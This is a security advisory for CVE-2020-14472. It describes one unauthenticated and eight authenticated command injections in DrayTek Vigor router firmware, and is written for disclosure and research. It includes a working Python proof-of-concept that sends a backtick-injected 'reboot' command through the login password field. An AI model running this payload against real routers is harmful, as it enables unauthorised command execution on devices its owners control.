# CVE-2020-14472 CMDi

- Products: DrayTek Vigor2960/3900/300B
- Firmware: < version 1.5.1.1

This CVE contains 1 CMDi without authorization and 8 CMDi with authorization.

****

## An unauthorized **Command Injection** @ mainfunction.cgi

We found an unauthorized CMDi @ mainfunction.cgi with the precondition that the router can be authorized by SMS. The vulnerability will be triggered by `frompassword` value containig injected commands such as "123456\`reboot\`".

If the router supports login by SMS and the user's phone number or the content of `/var/sms_phone_auth` is known by the attacker, then the attacker will be able to inject arbitary command by an evil payload such as the injection of `reboot` as the payload below.

```python=
from sys import argv
from base64 import b64encode
import requests

data = {
    "URL": "192.168.1.1",
    "HOST": "http://192.168.1.1",
    "action": "authuser",
    "formusername": b64encode(b"test").decode(),
    "formpassword": b64encode(b"12345678`reboot`").decode(),
    "PHONENUMBER": argv[1] # the known phone number
}
header = {
    "Content-Type": "application/raw"
}
url = {
    "root": "http://192.168.1.1",
    "cgi": {
        "root": "/cgi-bin",
        "uri": {
            "mf": "/mainfunction.cgi",
        }
    }
}

def build_url(p1, p2=None):
    if p2:
        return url["root"] + url[p1]["root"] + url[p1]["uri"][p2]
    else:
        return url["root"] + url[p1]

session = requests.session()
session.post(build_url("cgi", "mf"), data=data, headers=header)
```

****

## Eight authorized CMDi

There are some command injection vulnerabilities in the mainfunction.cgi file. The details are as follows:

**1. in downlaod_ovpn function**  

![](https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200618181430.png)  
The parameters from http_input are written directly to the buf of s without filtering, followed by system, which can causecommand injection

**2. in doOpenVpn function**  

![](https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200618181622.png)  
The value of "option" is from "http_input" and later concatenated and used by "system" without any special characters sanitizing, causing command injection

**3. int dumpSyslog_func**  

![](https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200618182201.png)  
The value of "option" is from "http_input", and single quote character allowed. So, since it is user-controllable, when user input closes the single quote, a command injection is done.

**4. in get_subconfig_func**  

![](https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200618182534.png)  
"rtick" is from "http_input", and further passed to "sub_F2D8". In "sub_F2D8", "rtick" is concatenated to "/tmp/ipv6_neigh_", then passed to "system", causing command injection.  
![](https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200618182631.png)

**5. in set_ap_map_config_func**  
The value of "option" is from "http_input",and will be spliced with "/sbin/ipsec_new_cer" , may cause command execution  
![](https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200618183008.png)

**6. in delete_wlan_profile_func**  

The value of "profile_number " is from "http_input" and will be spliced with "uci delete apm_wlan_profile.profile"， may cause command execution  
![](https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200618183605.png)

**7. in ruequest_certificate_func**  

The value of "option" will be spliced with "/sbin/ipsec_new_cer" , may cause command execution  
![](https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200618183646.png)

**8. in doGRETunnel_func**  

The table value will be spliced with "/etc/init.d/gretunnel disconnect_from_web '%s' 1>/dev/null 2>&1" ， may cause command execution  
![](https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200618183338.png)

****

## Founder
- C0ss4ck @ NJUPT (email: c0ss4ck9989@gmail.com)
- Swings @ Chaitin (email: weiming.shi@chaitin.com)
- MozhuCY @ NJUPT (email: mozhucy@gmail.com)